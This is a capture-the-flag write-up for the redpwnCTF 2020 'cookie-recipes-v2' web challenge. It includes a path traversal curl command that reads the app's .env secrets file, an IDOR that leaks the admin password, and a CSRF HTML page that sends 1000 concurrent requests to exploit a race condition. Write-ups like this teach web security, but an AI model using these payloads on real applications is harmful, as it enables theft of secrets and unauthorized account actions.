## Owner:

> CaptainFreak

#### Solved?

 - No

#### Tried:

No.

#### Solutions:

1. Unintended Solution:

The application uses dotenv to store the flag and also a path traversal vulnerability (unintended by the author)

dotenv fetches values from a file called .env. So we can get the flag by fetching this file!

```sh
curl --path-as-is https://cookie-recipes-v2.2020.redpwnc.tf/../../../../../../../app/.env

```

2. Intended Solution

1. From reading source you get to know that admin user is pushed into DB with id=0 and random password.

2. By IDOR on `GET /api/userInfo?id=0` you get the password and data of admin.

3. Observer that app is vuln to CSRF by "Content-Type","text/plain"

4. Now by Making admin bot visit our site with CSRF exploit code:

```html

<html><script>
    async function jsonreq() {
        var xhr = new XMLHttpRequest()
        xhr.open("POST","https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=13186538601383376495", true);
        xhr.withCredentials = true;
        xhr.setRequestHeader("Content-Type","text/plain");
        xhr.send(JSON.stringify({"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn"}));
    }
    for (var i = 0; i < 1000; i++) {
        jsonreq();
    }
</script></html>

```

5. Because code has RaceCondition bug in code where admin grants us gift points, ideally admin can only grant one gift per user but with this racing this check, Admin bot gives us enough credit to buy the Cookie recipe with flag in it.

6. Good chall, wish had tried properly.

7. Reference: https://ctftime.org/task/12103